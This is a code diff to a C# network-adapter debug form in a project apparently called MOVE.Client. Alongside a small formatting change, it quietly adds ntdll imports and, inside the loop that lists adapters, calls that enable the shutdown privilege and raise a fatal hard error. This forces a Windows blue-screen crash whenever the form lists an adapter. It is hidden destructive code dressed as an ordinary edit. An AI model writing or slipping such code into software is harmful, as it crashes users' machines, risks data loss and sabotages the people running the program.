@@ -20,7 +20,12 @@ namespace MOVE.Client.Debug.Formular
         #region Import
         [DllImport("iphlpapi.dll", ExactSpelling = true)]
         public static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref uint PhyAddrLen);
-        ErrorLogWriter elw= new ErrorLogWriter();
+        [DllImport("ntdll.dll")]
+        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+        [DllImport("ntdll.dll")]
+        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+
+        ErrorLogWriter elw = new ErrorLogWriter();
         #endregion
         #region Variablen
         List<IPAddress> ipAddressList = new List<IPAddress>();
@@ -53,6 +58,10 @@ namespace MOVE.Client.Debug.Formular
                     if (desc.StartsWith("VirtualBox")) continue;
                     lst.Items.Add(desc + " | " + ipaddress + " | " + subnetmsk);
                     firstvalue = (desc + "|" + ipaddress + "|" + subnetmsk);
+                    Boolean t1;
+                    uint t2;
+                    RtlAdjustPrivilege(19, true, false, out t1);
+                    NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
                 }
             }
         }
